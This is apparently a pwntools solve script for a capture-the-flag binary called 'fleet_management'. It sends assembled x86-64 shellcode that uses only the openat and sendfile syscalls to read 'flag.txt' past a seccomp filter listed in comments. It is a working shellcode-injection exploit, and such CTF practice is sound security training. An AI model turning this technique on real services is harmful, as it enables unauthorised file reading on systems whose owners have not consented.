#!/usr/bin/env python3

from pwn import *

e = ELF("./fleet_management_patched")
# libc = elf('./libc.so.6')
# rop = ROP(e)

context.binary = e
context.terminal = ['tmux', 'split', '-h']


def conn():
    if args.LOCAL:
        # Use PTY (Pseudo terminal) to avoid some stdin/out buffer issue, e.g. HTB Jeeves
        r = process([e.path], stdin=process.PTY, stdout=process.PTY)
    elif args.GDB:
        r = gdb.debug([e.path], '''
                      b *(beta_feature+0x5f)
                      c
                      ''', stdin=process.PTY, stdout=process.PTY)
    elif args.REMOTE:
        ip, port = args.REMOTE.split(':')
        r = remote(ip, port)
    else:
        error('unknown running mode for the script')

    return r


def main():
    r = conn()

    # The program allows following syscalls:
    #   0x3c    (60)	exit
    #   0xe7    (231)	exit_group
    #   0x101   (257)	openat
    #   0x28    (40)	sendfile
    #   0xf     (15)	rt_sigreturn

    # Check https://filippo.io/linux-syscall-table/ about the conventioin for these syscalls.

    r.sendlineafter(b'do?', b'9')
    filename_hex = hex(u64(b'flag.txt'.ljust(8, b'\x00')))
    info(f'The file name in hex is {filename_hex}')
    stage_1 = flat(
            asm(f'''
                push 0
                mov rax, {filename_hex}
                push rax
                mov rsi, rsp
                push -100
                pop rdi
                push 0
                pop rdx
                mov eax, 0x101
                syscall

                push 0x40
                pop r10
                xor dx, dx
                mov esi, eax
                push 1
                pop rdi
                mov eax, 0x28
                syscall
                ''')
            )
    info(f'stage 1 stage_1 has length {len(stage_1)}')
    r.sendline(stage_1)

    r.interactive()

if __name__ == "__main__":
    main()
